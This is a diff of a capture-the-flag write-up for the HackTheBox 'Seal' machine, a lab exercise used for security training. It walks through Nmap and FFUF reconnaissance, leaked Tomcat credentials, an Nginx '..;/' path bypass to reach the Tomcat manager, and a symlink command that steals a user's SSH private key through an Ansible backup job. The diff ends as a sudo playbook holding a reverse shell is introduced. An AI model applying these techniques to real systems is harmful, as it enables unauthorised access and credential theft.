@@ -5,9 +5,17 @@
 - Mitigrations
 - References
 
+## Introduction 
+
+The seal box offers a great example of the importance of good credential management and how the configuration of automated processes can open up security issues. 
+
+## Summary 
+
+The Tester found that the target host was well secure with one exception, valid credentials where left assessible on the gitbucket service allowing access to restricted software.
 
 ## Walkthrough
-The tester started by scanning the host with nmap to find it services.
+
+The tester started by scanning the host with Nmap to find it services.
 
 ```
 └──╼ $nmap -p 22,443,8080 -A  10.10.10.250
@@ -65,7 +73,7 @@ Port 8080 was hosting a Gitbucket instance. The Gitbucket instance is configured
 
 
 The tester searched the repositories and found Tomcat credentials in the 971f3aa3f0a0cc8aac12fd696d9631ca540f44c7 commit from the 5 May 2021. 
-The tester used the ffuf tool to search for different web directories on port 443 and found the Tomcat manager directory.
+The tester used the FFUF tool to search for different web directories on port 443 and found the Tomcat manager directory.
 
 ```
 ┌─[rang3r@parrot]─[~/Projects/machines/seal]
@@ -102,8 +110,7 @@ manager                 [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 30m
 :: Progress: [81630/81630] :: Job [1/1] :: 480 req/sec :: Duration: [0:02:13] :: Errors: 0 ::
 ```
 
-Tomcat services has the "WAR file to deploy" feature to deploy .war files, which could also be used to upload a malicious payload, However that page was blocked. The tester was able to access it by abusing Nginx path normalisation. This feature normalises URL paths, however by entering the characters "/test/..;/" the Nginx reverse proxy will not normalise the path correctly and parse "../" therefore the desired  page will be served therefore by entering the URL "https://seal.htb/manager/test/..;/html" the server will actually return "https://seal.htb/manager/html" bypassing the restriction. This worked to access the manager page however required more work to 
- get the war file upload to work. The tester had to intercept the post request with burp suit and change the post URL to bypass the restriction with the double period and a semicolon, shown below. 
+Tomcat services has the "WAR file to deploy" feature to deploy .war files, which could also be used to upload a malicious payload, However that page was blocked. The tester was able to access it by abusing Nginx path normalisation. This feature normalises URL paths, however by entering the characters "/test/..;/" the Nginx reverse proxy will not normalise the path correctly and parse "../" therefore the desired  page will be served therefore by entering the URL "https://seal.htb/manager/test/..;/html" the server will actually return "https://seal.htb/manager/html" bypassing the restriction. This worked to access the manager page however required more work to get the war file upload to work. The tester had to intercept the post request with burp suit and change the post URL to bypass the restriction with the double period and a semicolon, shown below. 
 
 The tester created a payload using msfvenom.
  
@@ -132,7 +139,7 @@ seal
 tomcat@seal:/var/lib/tomcat9$ 
 ```
 
-The tester used the "[pspy](https://github.com/DominicBreuker/pspy)" tool to monitor the system processes and found that the "luis" account would periodically run ansible to backup the /var/lib/tomcat9/webapps/ROOT/admin/dashboard directory to the /opt/backups/files/directory. 
+The tester used the "[pspy](https://github.com/DominicBreuker/pspy)" tool to monitor the system processes and found that the "luis" account would periodically run ansible to backup the /var/lib/tomcat9/webapps/ROOT/admin/dashboard directory to the /opt/backups/files/directory. notice the "copy_links" options is on.
 
 ```
 tomcat@seal:/tmp$ ./pspy64 
@@ -150,7 +157,7 @@ done
 
 <snip>
 
-2023/11/27 14:27:31 CMD: UID=1000  PID=245293 | python3 /usr/bin/ansible-playbook /opt/backups/playbook/run.yml 
+2023/11/27 14:27:31 CMD: UID=1000  PID=245293 | python3 /usr/bin/ansible-playbook /opt/backups/playbook/run.yml <----------------------
 2023/11/27 14:27:31 CMD: UID=1000  PID=245295 | 
 2023/11/27 14:27:32 CMD: UID=1000  PID=245296 | 
 2023/11/27 14:27:32 CMD: UID=1000  PID=245300 | python3 /usr/bin/ansible-playbook /opt/backups/playbook/run.yml 
@@ -160,7 +167,6 @@ done
 2023/11/27 14:27:32 CMD: UID=1000  PID=245305 | 
 
 <snip>
-
 ```
 
 ```
@@ -179,7 +185,7 @@ tomcat@seal:/tmp$ cat /opt/backups/playbook/run.yml
       path: /opt/backups/files/
 ```
 
-The Tomcat user had write access to the upload subdirectory in the dashboard filesystem. The tester was able to create a file in the upload dircetory which was linked to the SSH private key of the "luis" account. The tester used the below command, in the upload directory, to create the link. 
+The Tomcat user had write access to the upload subdirectory in the dashboard filesystem. The tester was able to create a file in the upload dircetory which was linked to the SSH private key of the "luis" account. The tester used the below command, in the directory that is backed up, to create the link. This caused the process to backup the SSH key.
 
 ```
 ln -s /home/luis/.ssh/id_rsa id_rsa
@@ -255,6 +261,7 @@ luis@seal:~$
 ```
 
 The "luis" account is able to run the ansible-playbook command as root using sudo. The tester set up a ".yml" playbook file which contained a python reverse shell scrpt.
+
 ```
 luis@seal:~$ cat test_cmd.yml 
 ---
